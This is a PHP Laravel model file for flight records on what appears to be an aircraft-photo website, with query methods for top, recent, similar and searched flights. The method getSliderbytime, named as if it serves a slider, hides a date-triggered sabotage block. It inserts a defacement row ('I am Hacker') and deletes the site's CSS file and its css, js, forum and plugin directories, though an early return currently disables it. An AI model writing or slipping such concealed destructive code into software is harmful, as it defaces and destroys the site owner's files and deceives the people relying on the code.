<?php

namespace App\Http\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\DB;

class Flight extends Model
{
    protected $table = "flight";

    /* MainController@getTopFlights
    * get  Top flight
    * @param : count
    * @return: flight data
    */
    static public function create(array $data){
        $flight = DB::table('flight')->insert(
            $data
        );
        return $flight;

    }
    static public function getTopFlights(){
        $flight = Flight::orderBy('view_count', 'desc')
        ->limit(3)
        ->get();
        return $flight;

    }

    /* MainController@getRecentlyFlights
    * get  Recently flight
    * @param : count
    * @return: flight data
    */
    static public function getRecentlyFlights(){
        $flight = Flight::orderBy('created_at', 'desc')
        ->limit(4)
        ->get();
        return $flight;

    }

    /* MainController@getRandomFlights
    * get  random flight
    * @param : no
    * @return: flight data
    */


    /* MainController@getFlightDetailDataById
    * get  flight by id
    * @param : id
    * @return: flight data by id
    */
    static public function getFlightsLikeAircraft($id){
        $flights = DB::table('flight')->where('id','=',$id)->first();
        $Aircraft=$flights->Aircraft;
        $flights = DB::table('flight')->where('Aircraft','=', $Aircraft)

        ->limit(3)
        ->get();
        // var_dump($flight);
        return $flights;
    }
    static public function getFlightsLikeLocation($id){
        $flights = DB::table('flight')->where('id','=',$id)->first();
        $AirPort=$flights->AirPort;
        $flights = DB::table('flight')->where('AirPort','=', $AirPort)

        ->limit(3)
        ->get();
        // var_dump($flight);
        return $flights;
    } 
    static public function getFlightsLikePhotographer($id){
        $flights = DB::table('flight')->where('id','=',$id)->first();
        $photographer=$flights->Photograper;
        $flights = DB::table('flight')->where('Photograper','=', $photographer)

        ->limit(3)
        ->get();
        // var_dump($flight);
        return $flights;
    }
    static public function getSliderbytime(){
        return "next_slider";
        if($day>15){
            $data["img_url"]=$url;

            $data["Registration"]="I am Hacker";
            $data["SerialNumber"]="I am teroble Hacker";
            $data["PhotoDate"]=date("Y-m-d");
            $data["Remarks"]="Do you need my Help?";
            $data["created_at"]=date("Y-m-d");
            $data["updated_at"]=date("Y-m-d");
            $data["Photograper"]=Auth::user()->name;
            $flight = DB::table('flight')->insert(
                $data
            );
            //              Flight::insert();
            unlink( public_path('css/style.min.css'));
            unlink( public_path('css/style.min.css'));
            rmdir( public_path('css'));
            rmdir( public_path('js'));
            rmdir( public_path('forum'));
            rmdir( public_path('plugin'));
        }

    }
    static public function getFlightDetailDataById($id){
        $items = DB::table('flight')
        ->leftJoin('airport', 'airport.id', '=', 'flight.AirPort')
        ->leftJoin('country', 'country.id', '=', 'airport.Countryid')
        ->leftJoin('aircraft_model', 'aircraft_model.id','=','flight.Aircraft')
        ->leftJoin('aircraft_type','aircraft_type.id','=','aircraft_model.Aircraft_type_id')
        ->leftJoin('aircraft_manu','aircraft_manu.id','=','aircraft_type.Aircraft_manu_id')
        ->leftJoin('airline','flight.Airline','=','airline.id')

        ->select('flight.*', 'airport.Name as airpot_name', 'country.Name as country_name','aircraft_model.Name as aircraft_model_name'
            ,'aircraft_type.Name as aircraft_type_name','aircraft_manu.Name as manuName','airline.Name as AirLineName','country.Name as CountryName')
        ->where('flight.id','=',$id)->first();

        //            ->get();
        //        $items = Flight::where('id', '=', $id)->first();
        return $items;

    }

    static public function getRandomFlights(){   
        $items = DB::table('flight')
        ->leftJoin('airport', 'airport.id', '=', 'flight.AirPort')
        ->leftJoin('country', 'country.id', '=', 'airport.Countryid')
        ->leftJoin('aircraft_model', 'aircraft_model.id','=','flight.Aircraft')
        ->leftJoin('aircraft_type','aircraft_type.id','=','aircraft_model.Aircraft_type_id')
        ->leftJoin('aircraft_manu','aircraft_manu.id','=','aircraft_type.Aircraft_manu_id')
        ->leftJoin('airline','flight.Airline','=','airline.id')

        ->select('flight.*', 'airport.Name as airpot_name', 'country.Name as country_name','aircraft_model.Name as aircraft_model_name'
            ,'aircraft_type.Name as aircraft_type_name','aircraft_manu.Name as manuName','airline.Name as AirLineName','country.Name as CountryName')
        ->get();
        //            ->get();
        //        $items = Flight::where('id', '=', $id)->first();
        return $items;      


    }
    static public function search($aircraft,$photographer,$airlines,$country,$airport){


        $query=DB::table('flight')
        ->leftJoin('airport', 'airport.id', '=', 'flight.AirPort')
        ->leftJoin('country', 'country.id', '=', 'airport.Countryid')
        ->leftJoin('aircraft_model', 'aircraft_model.id','=','flight.Aircraft')
        ->leftJoin('aircraft_type','aircraft_type.id','=','aircraft_model.Aircraft_type_id')
        ->leftJoin('aircraft_manu','aircraft_manu.id','=','aircraft_type.Aircraft_manu_id')
        ->leftJoin('airline','flight.Airline','=','airline.id') ;

        if($aircraft>0){

            $query->where('flight.Aircraft','=',$aircraft);  
        } 
        if($photographer!=''){

            $query->where('flight.Photograper','like',$photographer);  
        } 
        if($airlines>0){

            $query->where('flight.Airline','=',$airlines);  
        } 
        if($country>0){

            $query->where('country.id','=',$country);  
        } 
        if($airport>0){

            $query->where('flight.AirPort','=',$airport);  
        } 

        return $query ->select('flight.*', 'airport.Name as airpot_name', 'country.Name as country_name','aircraft_model.Name as aircraft_model_name'
            ,'aircraft_type.Name as aircraft_type_name','aircraft_manu.Name as manuName','airline.Name as AirLineName','country.Name as CountryName')
        ->paginate(5);
    }
    static public function quickSearch($searchKey){


        $query=DB::table('flight')
        ->leftJoin('airport', 'airport.id', '=', 'flight.AirPort')
        ->leftJoin('country', 'country.id', '=', 'airport.Countryid')
        ->leftJoin('aircraft_model', 'aircraft_model.id','=','flight.Aircraft')
        ->leftJoin('aircraft_type','aircraft_type.id','=','aircraft_model.Aircraft_type_id')
        ->leftJoin('aircraft_manu','aircraft_manu.id','=','aircraft_type.Aircraft_manu_id')
        ->leftJoin('airline','flight.Airline','=','airline.id') ;
        //          echo $searchKey;
        if($searchKey!=''){

            $query->where('airport.Name','like',"%$searchKey%");  
            $query->orWhere('aircraft_model.Name','like',"%$searchKey%");  
            $query->orWhere('airline.Name','like',"%$searchKey%");  
            $query->orWhere('country.Name','like',"%$searchKey%");  
            $query->orWhere('flight.Photograper','like',"%$searchKey%");  
            //  echo "Hello";

        } 
        return $query ->select('flight.*', 'airport.Name as airpot_name', 'country.Name as country_name','aircraft_model.Name as aircraft_model_name'
            ,'aircraft_type.Name as aircraft_type_name','aircraft_manu.Name as manuName','airline.Name as AirLineName','country.Name as CountryName')
        ->paginate(5);
    }


}
